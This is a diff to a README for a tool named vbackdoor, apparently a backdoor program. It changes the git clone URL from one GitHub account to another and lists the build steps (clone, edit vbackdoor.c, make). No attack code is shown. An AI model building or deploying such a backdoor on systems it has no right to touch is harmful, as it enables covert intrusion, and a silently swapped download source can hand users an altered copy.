@@ -4,7 +4,7 @@
 ### 编译（使用时修改vbackdoor.c内容）
 
 ```
-git clone https://github.com/veo/vbackdoor.git
+git clone https://github.com/tian1002/vbackdoor.git
 cd vbackdoor
 vi vbackdoor.c
 make
